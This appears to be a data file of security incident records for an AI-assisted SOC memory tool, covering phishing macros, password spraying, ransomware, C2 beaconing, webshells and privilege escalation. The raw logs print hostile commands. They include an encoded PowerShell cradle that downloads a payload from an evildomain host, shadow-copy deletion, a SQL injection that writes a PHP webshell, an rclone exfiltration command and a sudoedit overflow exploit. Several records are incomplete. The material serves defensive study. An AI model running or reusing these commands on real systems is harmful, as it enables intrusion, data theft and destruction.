title: Suspicious Encoded PowerShell Execution on Finance Workstation
description: EDR detected powershell.exe spawned by EXCEL.EXE with base64-encoded command line attempting to download external payload from suspicious domain.
raw_logs:
EventID: 4688
ProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbABkAG8AbQBhAGkAbgAuAHgAeQB6AC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==
ParentProcess: EXCEL.EXE (PID: 8432)
TargetIP: 198.51.100.44:8080

investigation_steps.action: Decode Base64 payload and extract C2 endpoint
investigation_steps.reason: Identify command and control server to block at edge perimeter

investigation_steps.action: Isolate FIN-WKS-042 from corporate subnet
investigation_steps.reason: Prevent lateral movement through SMB/WinRM
investigation_steps.expected_result: Host isolated with network quarantine rule

investigation_steps.action: Inspect user's Outlook inbox for weaponized attachment
investigation_steps.reason: Determine weaponized email delivery vector

root_cause: Malicious macro-enabled Excel sheet delivered via spear-phishing impersonating an invoice attachment.
remediation: Endpoint isolated via EDR, firewall perimeter blocked 198.51.100.44 and *.evildomain.xyz, user mailbox purged of phishing messages, user credentials revoked and reset.

analyst_feedback.comments: The suggested memory retrieval of past invoice macro incidents accelerated our triage from 35 mins down to 6 mins.

lessons_learned: Enforce strict Microsoft Office macro-blocking policy via GPO for all external attachments across finance and HR units.

title: Multiple Failed Kerberos Pre-Authentication Attempts (Password Spraying)
description: Domain controller recorded Event ID 4771 with Failure Code 0x18 across 48 domain accounts within 12 minutes coming from a single internal VPN IP.
raw_logs:
EventID: 4771
ServiceName: krbtgt/CORP.LOCAL
TargetUserName: svc_backup, jsmith, mross, dclark, bwayne...
FailureCode: 0x18 (Pre-authentication information was invalid)
ClientAddress: 10.240.12.88
LogonType: 3 (Network)

investigation_steps.action: Correlate VPN session for internal IP 10.240.12.88
investigation_steps.reason: Identify the compromised VPN user credential

investigation_steps.action: Check if any sprayed accounts succeeded authentication
investigation_steps.reason: Determine breach boundary and potential lateral movement

investigation_steps.action: Lock compromised accounts and terminate active VPN tunnel
investigation_steps.reason: Sever attacker access path

root_cause: Compromised contractor VPN credentials used to execute horizontal password spray against Active Directory.
remediation: Terminated active VPN session, reset passwords for ext_consultant_02 and svc_printer, enforced MFA for all contractor VPN groups.

analyst_feedback.comments: Accurately correlated Event 4771 code 0x18 with historical Kerberos spray playbook.

lessons_learned: Enforce MFA unconditionally on legacy VPN pools and decommission outdated service accounts with password expiration disabled.

title: Shadow Copy Deletion & Suspicious File Renaming (Ransomware Pre-Execution)
description: High-fidelity alert triggered by vssadmin.exe delete shadows /all /quiet execution followed by sudden entropy spike and mass file extension changes to .encrypX.
raw_logs:
Process: C:\Windows\System32\vssadmin.exe
Args: delete shadows /all /quiet
Parent: bcdedit.exe /set {default} recoveryenabled No
Followup: wmic shadowcopy delete
Path: D:\SharedData\Projects\* -> *.encrypX
IOC Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855

investigation_steps.action: Execute immediate hardware network port shutdown / hypervisor NIC disconnection
investigation_steps.reason: Halt active file encryption spreading to mounted shares

investigation_steps.action: Snapshot memory state of host for volatile artifact preservation
investigation_steps.reason: Capture encryption keys in RAM if unfinalized
investigation_steps.expected_result: Volatile memory saved for DFIR dump

investigation_steps.action: Verify immutable offline and cloud backup integrity
investigation_steps.reason: Ensure clean recovery points exist
investigation_steps.expected_result: Air-gapped backups from 02:00 UTC verified pristine

root_cause: BlackCat/ALPHV ransomware variant executed through scheduled task injected via compromised domain admin credential.
remediation: Hypervisor level isolation, restored volume from immutable snapshot, rotated Enterprise Admin credentials, rebuilt host from pristine golden image.

analyst_feedback.comments: The immediate containment warning prevented file share propagation. Memory retention of vssadmin deletion pattern matches Q3 incidents.

lessons_learned: Disable VSS deletion permissions for non-backup software agents and implement canary file honeypots on all NAS volumes.

title: Anomalous Outbound Beaconing to Untrusted Autonomous System (C2 Activity)
description: Network traffic analyzer identified regular HTTPS POST requests every 45 seconds (+/- 5% jitter) to Russian hosting provider with small fixed payload lengths.
raw_logs:
Protocol: TLSv1.3
SrcIP: 10.100.4.15:44392
DstIP: 185.220.101.5:443
DstAS: AS49453 (Global Telecommunication)
Interval: 45.1s, 44.8s, 45.3s, 45.0s (Jitter 0.05)
JA3 Fingerprint: e7d705a3286e19ea42f587b344ee6865
Process: /tmp/.systemd-worker

investigation_steps.action: Terminate PID associated with hidden executable /tmp/.systemd-worker
investigation_steps.reason: Kill live outbound C2 channel

investigation_steps.action: Collect binary /tmp/.systemd-worker for reverse engineering
investigation_steps.reason: Extract hardcoded config and secondary C2 fallback domains

investigation_steps.action: Trace parent process lineage back to initial entry point
investigation_steps.reason: Find vulnerability exploited to create /tmp executable

root_cause: Sliver C2 framework dropped via unauthenticated RCE on internal development microservice.
remediation: C2 IP blocked on egress Palo Alto firewall, implant purged, web application patched against command injection vulnerability, server redeployed in isolated DMZ.

analyst_feedback.comments: Detection of JA3 fingerprint matches our earlier memory entry from the penetration test repository.

lessons_learned: Enforce strict egress filtering blocking outbound traffic from application tiers directly to untrusted public IP ranges.

title: Scheduled Task Persistence Created via Schtasks with SYSTEM Privileges
description: Windows Security Event 4698 logged creation of scheduled task named 'OneDriveHealthCheck' executing a script located in C:\Users\Public\Videos.
raw_logs:
EventID: 4698
TaskName: \Microsoft\Windows\OneDriveHealthCheck
Action: C:\Windows\System32\cmd.exe /c C:\Users\Public\Videos\update.vbs
Schedule: At logon of any user
RunLevel: HighestAvailable

investigation_steps.action: Inspect contents of C:\Users\Public\Videos\update.vbs
investigation_steps.reason: Determine payload functionality and secondary downloads

investigation_steps.action: Delete malicious scheduled task 'OneDriveHealthCheck'
investigation_steps.reason: Eliminate reboot persistence mechanism

investigation_steps.action: Scan all workstations for similar tasks in C:\Users\Public
investigation_steps.reason: Check for organizational sprawl

root_cause: Malware persistence established following execution of malicious email link.
remediation: Task removed, VBScript quarantined, user trained on link safety, Public folder execution restricted via AppLocker.

analyst_feedback.comments: Clear step-by-step remediation plan.

lessons_learned: Block script execution (vbs, js, bat) from world-writable directories such as C:\Users\Public via AppLocker policy.

title: Privilege Escalation via Potato Exploit on IIS Web Server
description: EDR detected creation of privileged token using GodPotato exploit against local RPC endpoint to elevate from service account to NT AUTHORITY\SYSTEM.
raw_logs:
Alert: Suspicious Token Impersonation
Process: C:\inetpub\temp\gp.exe
Privilege: SeImpersonatePrivilege enabled
RPC Binding: ncacn_np:localhost[\pipe\epmapper]
Target Identity: NT AUTHORITY\SYSTEM
Parent: w3wp.exe (PID: 3210)

investigation_steps.action: Quarantine WEB-FRONTEND-01 from production DMZ
investigation_steps.reason: Prevent pivot from DMZ into internal database tier

investigation_steps.action: Analyze IIS web logs for webshell interaction prior to execution
investigation_steps.reason: Identify webshell entry point and remote attacker IP

investigation_steps.action: Remove file gp.exe and logo.aspx
investigation_steps.reason: Eradicate exploit binary and webshell

root_cause: Unrestricted file upload vulnerability allowed .aspx webshell upload, followed by GodPotato privilege escalation using SeImpersonatePrivilege.
remediation: Removed webshell and exploit binaries, removed SeImpersonatePrivilege from IIS worker pool, applied file extension whitelist on upload endpoint.

analyst_feedback.comments: The Hindsight retrieval remembered a similar SeImpersonatePrivilege incident from 2 months ago, suggesting exact GPO removal command.

lessons_learned: Strip SeImpersonatePrivilege from web service accounts and configure IIS to refuse execution permissions in upload directories.

title: Impossible Travel Alert: Concurrent Logins from USA and Romania
description: Entra ID Identity Protection flagged risk event: Authenticated session in New York, US followed 14 minutes later by session from Bucharest, RO (distance 7,600 km).
raw_logs:
Event: UserRiskEvent
User: sarah.connor@cybermemory.ai
Event 1: 18:26:10 UTC | IP: 104.28.19.12 (New York, US) | Client: Safari MacOS
Event 2: 18:40:24 UTC | IP: 188.24.11.90 (Bucharest, RO) | Client: Chrome Windows
RiskLevel: High
App: Microsoft 365 Exchange Online

investigation_steps.action: Contact employee via verified phone channel
investigation_steps.reason: Determine if user initiated second session via commercial VPN
investigation_steps.expected_result: User confirmed being in New York; did not recognize Romania login

investigation_steps.action: Revoke all active Azure AD OAuth refresh tokens
investigation_steps.reason: Kill hijacked session token instantly

investigation_steps.action: Audit mailbox forwarding rules and inbox rules
investigation_steps.reason: Check if attacker created auto-forwarding rule for business email compromise
investigation_steps.expected_result: Found rule forwarding invoices to external gmail address

root_cause: Session token stolen via adversary-in-the-middle (AiTM) phishing proxy that bypassed standard MFA.
remediation: Tokens invalidated, malicious forwarding rule deleted, account password reset, enrolled user in FIDO2 hardware token program.

analyst_feedback.comments: The prompt to check mailbox forwarding rules was crucial—we almost missed the stealthy inbox rule.

lessons_learned: Transition all critical accounts from SMS/app-based MFA to FIDO2 / Passkey phishing-resistant authentication.

title: Suspected Data Exfiltration: 48 GB Uploaded via Rclone to AWS S3
description: Network flow monitor alerted on continuous 800 Mbps outbound connection from sensitive storage node to unexpected Amazon S3 bucket not belonging to company organization.
raw_logs:
Protocol: HTTPS (TCP 443)
SrcIP: 10.20.5.12
DstIP: 52.216.142.9 (s3-us-west-2.amazonaws.com)
PayloadSize: 48.7 Gigabytes in 42 minutes
Process: /usr/local/bin/rclone copy /var/data/customer_vault/ remote:data-dump-bucket-912 --transfers 16

investigation_steps.action: Kill rclone PID and block outbound AWS S3 endpoints temporarily
investigation_steps.reason: Stop ongoing data theft in real time
investigation_steps.expected_result: Transfer halted at 48 GB out of 250 GB target

investigation_steps.action: Retrieve rclone configuration file (~/.config/rclone/rclone.conf)
investigation_steps.reason: Identify destination bucket owner and access key IDs

investigation_steps.action: Submit urgent abuse report to AWS Trust & Safety
investigation_steps.reason: Request immediate freeze of receiving bucket and preservation of attacker audit logs
investigation_steps.expected_result: Bucket frozen by AWS within 2 hours

root_cause: Compromised SSH root private key used by adversary to stage and exfiltrate customer database dump via rclone.
remediation: Network connection dropped, SSH keys replaced with certificate-based short-lived access, incident reported to data privacy officer, forensic image created.

analyst_feedback.comments: The suggested step of extracting rclone.conf gave us the exact AWS key to freeze the exfiltration target.

lessons_learned: Implement cloud egress proxy restricting S3 access only to whitelisted corporate AWS VPC endpoints.

title: SQL Injection & Webshell Drop on Legacy Customer Portal
description: WAF triggered on stacked SQL query injected into 'customer_id' parameter, followed by creation of obfuscated PHP file inside /var/www/html/assets/css/.
raw_logs:
URI: /billing/view.php?customer_id=102' UNION SELECT 1,'<?php @eval($_POST["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/assets/css/style.min.php'-- -
Status: 200 OK
IP: 45.154.255.89
Referer: None
User-Agent: sqlmap/1.7#stable

investigation_steps.action: Delete webshell /var/www/html/assets/css/style.min.php
investigation_steps.reason: Prevent remote command execution through HTTP POST

investigation_steps.action: Patch vulnerable SQL query in /billing/view.php with prepared statements
investigation_steps.reason: Close injection vulnerability
investigation_steps.evidence: Git commit diff using PDO parameterized queries

investigation_steps.action: Review database query logs for exfiltrated tables
investigation_steps.reason: Determine if user records were dumped prior to webshell drop
investigation_steps.expected_result: Confirmed schema probe only, no bulk table dump

root_cause: Legacy PHP application missing parameter binding allowed UNION SELECT INTO OUTFILE webshell injection.
remediation: Webshell removed, application converted to PDO prepared statements, WAF rule set from Detect to Block mode, IP 45.154.255.89 blacklisted.

analyst_feedback.comments: Immediate detection of sqlmap user agent and file creation pattern.

lessons_learned: Enforce WAF virtual patching and migrate legacy PHP scripts to modern ORM frameworks.

title: DevOps Automated Backup Script Flagged as Ransomware
description: SOC alert raised for high file modification rate and 7-zip command line encryption on internal non-production database dumps.
raw_logs:
Alert: Mass File Encryption Detected
Process: 7z.exe a -p***** -mhe=on D:\Backups\db_nightly.7z D:\Databases\*.sql
FileCount: 420 files renamed/compressed in 180 seconds
User: corp\svc-backup

investigation_steps.action: Cross-reference scheduled task 'NightlyDatabaseBackup' with IT change management ticket
investigation_steps.reason: Verify if activity is legitimate scheduled IT operation
investigation_steps.evidence: Jira ticket IT-8921 approved by DevOps Lead
investigation_steps.expected_result: Confirmed planned encryption of backup archives

investigation_steps.action: Verify digital signature of 7z.exe
investigation_steps.reason: Ensure legitimate 7-zip binary without trojan modification
investigation_steps.evidence: Authenticode signature valid from Igor Pavlov

root_cause: Legitimate automated nightly compression and encryption script triggered generic heuristic ransomware detection rule.
remediation: Updated EDR detection policy to exclude whitelisted backup service account executing signed 7-zip binaries inside D:\Backups.

analyst_feedback.comments: Great correlation with historical false positive patterns. Avoided unnecessary middle-of-the-night incident escalation.

lessons_learned: Tune SOC behavioral detection rules to account for authorized administrative tools using strong encryption.

title: Suspicious PowerShell Downloading Script via BITSAdmin

investigation_steps.action: Terminate active BITS transfer job
investigation_steps.reason: Stop pending file retrieval

investigation_steps.action: Block update-telemetry.services on DNS sinkhole
investigation_steps.reason: Prevent repeated download attempts

remediation: Downloaded binary deleted, BITS job purged, browser extensions audited and wiped.

analyst_feedback.comments: The memory bank recalled similar BITS abuse from previous month.

lessons_learned: Restrict BITSAdmin execution to domain administrative accounts via GPO Software Restriction Policies.

title: Phishing Email with SVG Smuggling Attachment Targeting Executives

EmbeddedBlob: data:application/octet-stream;base64,TVqQAAMAAAAEAAAA//8AALgAAAAAAA...

analyst_feedback.comments: Hindsight provided exact regex to identify SVG smuggling markers in gateway logs.

lessons_learned: Enforce strict attachment sandboxing and disallow direct HTML/SVG attachments from external sources.

title: Suspicious DNS Tunneling Query Volume to Non-Existent TLD
description: SIEM detected over 14,000 sub-queries to randomly generated subdomains of *.exfil-telemetry-cdn.biz within 15 minutes with high entropy TXT records.
raw_logs:
DNS Query Type: TXT
Queries: 
 - 01a9f3b89c.exfil-telemetry-cdn.biz
 - 0288d7c2a1.exfil-telemetry-cdn.biz
 - 03ee5519ab.exfil-telemetry-cdn.biz
Entropy: 4.82 (High)

investigation_steps.action: Implement immediate Response Policy Zone (RPZ) block for *.exfil-telemetry-cdn.biz
investigation_steps.reason: Cut DNS data channel immediately

investigation_steps.action: Isolate host Marketing-12 (10.150.3.40)
investigation_steps.reason: Inspect local process executing raw DNS socket requests

remediation: RPZ block created, host isolated and wiped, DNS query length limits configured on recursive resolvers.

analyst_feedback.comments: Entropy thresholding calculation matched our memory baseline.

lessons_learned: Enable DNS inspection with entropy scoring on core recursive resolvers to detect sub-label data smuggling.

title: WMI Event Subscription Established for Stealthy Boot Persistence
description: Sysmon Event 19, 20, 21 detected __EventFilter and CommandLineEventConsumer created to execute powershell script upon machine boot.
raw_logs:
EventID: 19 (WmiEvent - WmiEventFilter activity detected)
Name: BckHealthFilter
Query: SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'
Consumer: CommandLineEventConsumer.Name="BckHealthConsumer"
CommandLine: powershell -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA...

investigation_steps.action: Delete WMI Filter and Consumer using Get-CimInstance and Remove-CimInstance
investigation_steps.reason: Eradicate persistent WMI trigger

investigation_steps.action: Inspect scrcons.exe process memory dump
investigation_steps.reason: Determine what script was executed during recent boot
investigation_steps.expected_result: Script attempted connection to internal subnet

root_cause: Adversary gained administrative access through unpatched SQL server vulnerability and created stealth WMI event subscription for persistent survival.
remediation: WMI persistence purged, SQL server patched and firewalled, database service account rights downgraded.

analyst_feedback.comments: Exact PowerShell CIM syntax for WMI removal provided by Hindsight saved time.

lessons_learned: Regularly audit root\subscription WMI namespaces across critical database infrastructure.

title: Interactive Logon by Service Account 'svc-sql-cluster' Outside Business Hours

raw_logs:
EventID: 4624
LogonType: 10 (RemoteInteractive)
TargetUserName: svc-sql-cluster
SourceNetworkAddress: 192.168.100.24
Time: 02:44:11 AM (Sunday)
ProcessName: C:\Windows\System32\svchost.exe

investigation_steps.action: Disconnect and lock active RDP session
investigation_steps.reason: Interrupt unauthorized remote desktop session

investigation_steps.action: Investigate source IP 192.168.100.24
investigation_steps.reason: Identify which workstation on the management network was used as pivot
investigation_steps.expected_result: Traced to compromised IT Helpdesk laptop

analyst_feedback.comments: Fast identification of Logon Type 10 violation.

lessons_learned: Enforce Group Policy denying interactive and RDP logon privileges to all non-human service accounts.

title: Brute-Force SSH Attempts Against DMZ Bastion Host
description: Auth.log reported 5,200 failed public key and password attempts from Chinese hosting IP within 30 minutes. All rejected by PAM.

Nov 5 12:28:10 bastion sshd[22910]: Failed password for invalid user admin from 112.85.42.19 port 48102 ssh2
Nov 5 12:28:12 bastion sshd[22915]: Failed password for root from 112.85.42.19 port 48104 ssh2
Nov 5 12:28:14 bastion sshd[22920]: Connection closed by authenticating user 112.85.42.19 [preauth]

investigation_steps.action: Verify Fail2ban status on BASTION-EXT-01
investigation_steps.reason: Ensure automated jail banned the attacking IP

investigation_steps.reason: Ensure password authentication is disabled in sshd_config

remediation: Fail2ban automatically banned IP, verified bastion allows only hardware-backed SSH keys and requires VPN tunnel.

title: Suspicious PowerShell In-Memory Injection via Process Hollowing
description: EDR flagged powershell.exe invoking VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread targeting svchost.exe.
raw_logs:
Alert: Process Injection (T1055.012)
Source: powershell.exe (PID: 6712)
Target: C:\Windows\System32\svchost.exe (PID: 1044)
API Calls: OpenProcess(PROCESS_ALL_ACCESS) -> VirtualAllocEx(PAGE_EXECUTE_READWRITE) -> WriteProcessMemory -> CreateRemoteThread
Entropy: 7.21 (Shellcode pattern)

investigation_steps.action: Instantly kill hollowed svchost.exe (PID 1044) and parent powershell.exe
investigation_steps.reason: Terminate injected payload execution thread

investigation_steps.action: Dump shellcode buffer from memory before shutdown
investigation_steps.reason: Extract payload configuration and C2 address

root_cause: Developer downloaded unauthorized cracked software tool containing embedded Cobalt Strike loader.
remediation: Endpoint wiped and re-imaged, developer security coaching session scheduled, local administrative rights revoked.

analyst_feedback.comments: Process hollowing signature matched memory bank rule accurately.

lessons_learned: Remove local administrator privileges from developer workstations and enforce Windows Defender Application Control.

title: Apache Struts Remote Code Execution Attempt on Legacy Internal Server

investigation_steps.reason: Prevent worm-like spread across internal subnets

investigation_steps.reason: Check if wget command succeeded

remediation: Decommissioned legacy VM permanently; ordering functionality was already migrated to modern cloud portal.

analyst_feedback.comments: Memory retrieval flagged this obsolete server as a decommission candidate from last quarter's audit.

title: Privilege Escalation via Sudo CVE-2021-3156 (Baron Samedit) on Linux Build Server
description: Host IDS detected heap-based buffer overflow in sudoedit command line parsing invoked by jenkins CI user to gain root shell.
raw_logs:
Command: sudoedit -s '\' `perl -e 'print "A" x 65536'`
UID: 1002 (jenkins)
EUID: 0 (root)
Syscall: execve('/bin/sh')
Auditd Event: type=EXECVE a0="sudoedit" a1="-s" a2="\\"...

investigation_steps.action: Kill unauthorized root shell spawned under jenkins UID
investigation_steps.reason: Stop interactive privileged access

investigation_steps.action: Update sudo package to version >= 1.9.5p2
investigation_steps.reason: Patch Baron Samedit vulnerability

root_cause: Outdated sudo binary on legacy CI agent container allowed unprivileged Jenkins build job to gain root access.
remediation: Upgraded sudo across all CI build nodes, hardened container execution with unprivileged Docker flags and user namespaces.

analyst_feedback.comments: Exact CVE identification and mitigation steps provided instantly.

lessons_learned: Automate container base image updates and scanning in CI/CD pipelines before deployment to build clusters.
